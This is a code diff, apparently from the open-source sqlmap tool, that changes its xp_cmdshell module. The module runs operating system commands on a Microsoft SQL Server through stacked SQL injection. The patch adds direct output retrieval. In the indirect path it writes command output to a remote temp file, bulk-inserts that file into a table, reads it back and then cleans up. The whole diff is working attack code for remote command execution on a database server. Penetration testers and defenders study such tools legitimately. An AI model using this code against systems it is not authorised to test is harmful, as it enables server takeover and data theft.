@@ -107,28 +107,42 @@ class xp_cmdshell:
 
     def xpCmdshellExecCmd(self, cmd, silent=False):
         cmd = self.xpCmdshellForgeCmd(cmd)
-        inject.goStacked(cmd, silent)
+        return inject.goStacked(cmd, silent)
 
     def xpCmdshellEvalCmd(self, cmd, first=None, last=None):
         self.getRemoteTempPath()
 
-        tmpFile = "%s/tmpc%s.txt" % (conf.tmpPath, randomStr(lowercase=True))
-        cmd = "%s > \"%s\"" % (cmd, tmpFile)
+        if conf.direct:
+            output = self.xpCmdshellExecCmd(cmd)
 
-        self.xpCmdshellExecCmd(cmd)
+            if output and isinstance(output, (list, tuple)):
+                new_output = ""
 
-        inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (self.cmdTblName, tmpFile, randomStr(10), randomStr(10)))
+                for line in output:
+                    if line == "NULL":
+                        new_output += "\n"
+                    else:
+                        new_output += "%s\n" % line.strip("\r")
 
-        self.delRemoteFile(tmpFile)
+                output = new_output
+        else:
+            tmpFile = "%s/tmpc%s.txt" % (conf.tmpPath, randomStr(lowercase=True))
+            cmd = "%s > \"%s\"" % (cmd, tmpFile)
 
-        output = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.cmdTblName), resumeValue=False, unique=False, firstChar=first, lastChar=last, safeCharEncode=False)
-        inject.goStacked("DELETE FROM %s" % self.cmdTblName)
+            self.xpCmdshellExecCmd(cmd)
 
-        if output and isinstance(output, (list, tuple)):
-            output = output[0]
+            inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (self.cmdTblName, tmpFile, randomStr(10), randomStr(10)))
+
+            self.delRemoteFile(tmpFile)
+
+            output = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.cmdTblName), resumeValue=False, unique=False, firstChar=first, lastChar=last, safeCharEncode=False)
+            inject.goStacked("DELETE FROM %s" % self.cmdTblName)
 
             if output and isinstance(output, (list, tuple)):
                 output = output[0]
+
+                if output and isinstance(output, (list, tuple)):
+                    output = output[0]
 
         return output
 
